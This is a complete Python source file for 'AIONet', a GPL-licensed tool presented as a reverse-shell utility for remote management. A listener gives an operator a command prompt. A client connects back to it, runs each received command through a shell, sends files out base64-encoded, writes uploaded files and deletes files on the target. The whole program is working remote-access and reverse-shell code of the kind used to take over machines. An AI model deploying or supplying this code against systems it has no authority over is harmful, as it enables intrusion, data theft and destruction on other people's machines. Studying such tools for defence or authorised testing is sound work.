# Network utility to spawn reverse shells for remote management
# Copyright (C) 2020  Aditya Arole

# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.

# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
	
# Import required libraries
import argparse
import base64
from datetime import datetime
import hashlib
import os
import socket
import subprocess
import sys
import threading


# Create a class for the server (listener)
class Server:
	# Define constructor with port as argument
	def __init__(self,port):
		# Set host to 0.0.0.0 to accept all IPs linked to the host
		# Set port to the one specified during object instantiation
		self.host = "0.0.0.0"
		self.port = port
		self.base_dir = os.getcwd()
		
		# Create a socket object, bind it to the host, listen for connections and inform the user
		listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		listener.bind((self.host,self.port))
		listener.listen(5)
		print(f"Listening on {self.host}:{self.port}")

		# Loop till connection is received
		while True:
			self.connection, self.address = listener.accept()
			print()
			print(f"Received connection from {self.address}")
			break
		
		ts = datetime.now()
		foo = ts.strftime("%Y%m%d")+"_"+ts.strftime("%H-%M-%S")
		bar = ts.strftime("%B %d, %Y")
		
		self.log_file = open(f"{self.base_dir}/{self.address[0]}_{foo}.log", "w")
		self.log_file.write("AIONet log file\n")
		self.log_file.write("https://github.com/aarole/aionet\n\n")
		self.log_file.write(f"Remote Host: {self.address[0]}\n")
		self.log_file.write(f"Remote Port: {self.address[1]}\n")
		self.log_file.write(f"Date: {bar}\n")
		self.log_file.write("------------------------------------------------\n")
		
		# Start a thread to handle the connection
		ct = threading.Thread(target=self.handle, args=())
		ct.start()
	

	# Define method to handle connections
	def handle(self):
		# Infinite loop to handle connections
		while True:
			# Provide shell prompt and receive input
			command = input("AIONet > ")

			# Check if upload command was used (append a new-line sentinel no matter the command)
			if command[0:6] == "upload":
				try:
					# Use the upload_file function to get base64 file and SHA256 hash
					content,chash = self.upload_file(command)
					# Create the bytes object to be sent
					command = bytes(command, "utf-8") + b' ' + content + b' ' + chash +b'\n'
				except Exception as e:
					print(f"Error: {str(e)}")
					continue
			else:
				command += "\n"
			
			# If exit command received, inform the client and close the connection
			if command == "exit\n":
				print(f"Closing connection to {self.address[0]}")
				self.connection.send(bytes(command, "utf-8"))
				print("Connection closed")
				self.log_file.close()
				return

			self.log_file.write(f"\nCommand:\n{command.strip()}\n\n")

			# Get the response using the Remote Code Execution (RCE) function
			response = self.rce(command)

			# If download command is run, call the download_file function
			if type(command) is not bytes:
				if command[0:8] == "download":
					response = self.download_file(command, response)
				
			# Print the response received
			print(response.strip()[:-1])

			self.log_file.write(f"Response:\n{response.strip()[:-1]}\n")
			self.log_file.write("------------------------------------------------\n")



	# Define function to download files from a client
	def download_file(self, command, response):
		# Get the filename from the second part of the input
		path = str(command).split(" ")[1].rstrip()
		# Use the response to get the base64 file and its hash
		response = response.split(" ")
		received = response[0].strip()
		content = response[1].strip()
		try:
			with open(path,"wb") as dl_file:
				# Decode the base64 content
				dec_content = base64.b64decode(content)
				# Find the hash on the local machine
				local = hashlib.sha256(dec_content).hexdigest()
				# If the hashes match, write the file and return a success message
				if received == local:
					dl_file.write(dec_content)
					dl_file.close()
					return f"Downloaded {path}\nSHA256 hash verified:\nReceived: {received}\nLocal:    {local}\n"
				else:
					# Raise a hash verification failed exception
					raise Exception("Hash verification failed.")
		except Exception as e:
			# Catch any exceptions, remove the file (if created) and return the error message
			os.remove(path)
			return f"Download failed: {str(e)}\n"

	
	# Define method to upload files to the client
	def upload_file(self, command):
		# Get the file name from the second part of the input
		path = command.split(" ")[1]
		try:
			with open(path, "rb") as up_file:
				# Read the file and hash its contents
				content = up_file.read()
				content_hash = hashlib.sha256(content).hexdigest()
				# Convert the hash and contents to bytes
				if type(content) is not bytes:
					content = bytes(content, "utf-8")
				if type(content_hash) is not bytes:
					content_hash = bytes(content_hash, "utf-8")
				# Return hash and base64 encoded contents
				return base64.b64encode(content), content_hash
		except FileNotFoundError:
			raise Exception(f"{path} does not exist in the directory where AIONet was started ({self.base_dir})\n")
	
	
	# Define method to executre commands remotely
	def rce(self, command):
		# Convert command to bytes
		if type(command) is not bytes:
			command = bytes(command, "utf-8")
		# Send the command to the client
		self.connection.send(command)

		# Create a response string
		response = "\n"
		# Receive data in chunks and append to the response string till the \0 sentinel is received
		while response[-1] != "\x00":
			data = self.connection.recv(4096)
			response += data.decode("utf-8")
		# Strip the leading and trailing whitespace/new-line
		response.strip()

		# Return the response
		return response


# Create a class for the client (remote target)
class Client:
	# Define the constructor with listener ip and port as arguments
	def __init__(self, ip, port):
		# Create a socket and connect to it
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.connection.connect((ip, port))
		# Create a new thread to run the connection
		lt = threading.Thread(target=self.run, args=())
		lt.start()


	# Define a method to accept a command and run it using subprocess.checkoutput
	def exec_command(self, command):
		return subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)


	# Define a method to move through the filesystem
	def move_fs(self, command):
		# Get the new location from the second part of the command
		new_dir = command.split(" ")[1]
		# Try to change location, inform user of the outcome
		try:
			os.chdir(new_dir)
			return f"Changed directory to {new_dir}\n"
		except Exception as e:
			return f"Error changing directory: {str(e)}\n"


	# Define a method to remove a file
	def remove_file(self, command):
		# Get the file to remove from the second part of the command
		to_remove = command.split(" ")[1]
		# Try to remove the file, inform user of the outcome
		try:
			os.remove(to_remove)
			return f"Removed {to_remove}\n"
		except Exception as e:
			return f"Error removing file: {str(e)}\n"

	
	# Define the driver method for the Client class
	def run(self):
		# Infinite loop to run while the connection is active
		while True:
			# Initialize a local command variable
			# Receive data from the Server till the new-line sentinel is received
			command = ""
			while "\n" not in command:
				command += self.connection.recv(4096).decode("utf-8")
			# Remove the new-line character from the command
			command = command.rstrip()

			# Initialize a variable for the result
			result = ""
			try:
				# If the exit command is received, close the connection
				if command == "exit":
					self.connection.close()
					sys.exit(0)
				# If the cd command is received, try to change directories
				elif command[0:2] == "cd":
					# If length is greater than 3, change location; else, raise a Path missing exception
					if len(command) > 3:
						result = self.move_fs(command)
					else:
						raise Exception("Path missing")
				# If the download command is received, use the output of the read_file command as the result
				elif command[0:8] == "download":
					result = self.read_file(command)
				# If the upload command is received, use the output of the write_file command as the result
				elif command[0:6] == "upload":
					result = self.write_file(command)
				# If the rm command is received, try to remove item
				elif command[0:2] == "rm":
					# If length of the command is greater than 3, use the remove_file function
					# Else, raise a File name missing exception
					if len(command) > 3:
						result = self.remove_file(command)
					else:
						raise Exception("File name missing")
				# Else, execute the command using the exec_command function
				else:
					result = self.exec_command(command)
			# Catch any exceptions and use the error as the result
			except Exception as e:
				result = f"Error: {str(e)}"

			# Append the \0 sentinel to the result
			if type(result) is not bytes:
				result += "\0"
			else:
				result += b"\0"

			# Convert the result to bytes, if required
			if type(result) is not bytes:
				result = bytes(result, "utf-8")

			# Send the result to the server
			self.connection.send(result)


	# Define a method to read files and return the contents
	def read_file(self, command):
		# Get the file name using the second part of the command
		path = str(command).split(" ")[1].rstrip()
		with open(path, "rb") as in_file:
			# Read the file and hash its contents
			content = in_file.read()
			content_hash = hashlib.sha256(content).hexdigest()
			# Convert the contents and hash to bytes
			if type(content) is not bytes:
				content = bytes(content, "utf-8")
			if type(content_hash) is not bytes:
				content_hash = bytes(content_hash, "utf-8")
			# Combine the hash and contents and return the bytes object
			combined = content_hash + b" " + base64.b64encode(content)
			return combined


	# Define a method to write files uploaded by the server
	def write_file(self, command):
		# Split the command and get the file name, contents and hash
		split_command = command.split(" ")
		path = split_command[1]
		content = split_command[2]
		chash = split_command[3]
		try:
			with open(path,"wb") as out_file:
				# Decode the base64 contents
				dec_content = base64.b64decode(content)
				# Hash the decoded contents
				whash = hashlib.sha256(dec_content).hexdigest()
				# If the hashes match, write the file 
				# Else, raise a hash verification failed exception
				if chash == whash:
					out_file.write(dec_content)
					out_file.close()
					return f"Uploaded {path}\nSHA256 hash verified:\nReceived: {chash}\nLocal:    {whash}\n"
				else:
					raise Exception("Hash verification failed.")
		# Catch any exception
		except Exception as e:
			# Remove the file
			os.remove(path)
			# Return an upload failed message
			return f"Upload failed: {str(e)}\n"


# Create a method to get the arguments from the command line
def define_args():
	# Define the usage string
	usage_str = """On host: python3 aionet.py -p PORT -l
	On remote machine: python3 aionet.py -t TARGET -p PORT"""
	# Create an ArgumentParser object
	parser = argparse.ArgumentParser(description="All-In-One Network Utility by Aditya Arole (@e1ora)",usage=usage_str)
	# Add the -t, -p and -l arguments
	parser.add_argument("-t","--target",dest="target",type=str,metavar="target",help="IP address of the remote listener")
	parser.add_argument("-p","--port",dest="port",type=int,metavar="port",help="If used with -l, port where listener is to be created; else, port where remote listener exists")
	parser.add_argument("-l","--listen",dest="listen",action="store_true",help="Create a listener on the port defined using -p")
	# Set defaults for boolean arguments to False
	parser.set_defaults(listen=False)

	# If no arguments are provided, print the help message and exit
	if not len(sys.argv) > 1:
		parser.print_help()
		exit()
	
	# Return the command line arguments
	return parser.parse_args(sys.argv[1:])


# Define the driver method for the program
def main():
	# Get the arguments with the define_args method
	args = define_args()

	# If the -l flag is used, create a listener
	# Else, create a Client object
	if args.listen:
		Server(args.port)
	else:
		Client(args.target,args.port)


# If the AIONet.py file is run, try running the driver function
# If a KeyboardInterrupt is received, print an exit message and quit
if __name__ == "__main__":
	try:
		main()
	except KeyboardInterrupt:
		print("Exiting")
		sys.exit(0)
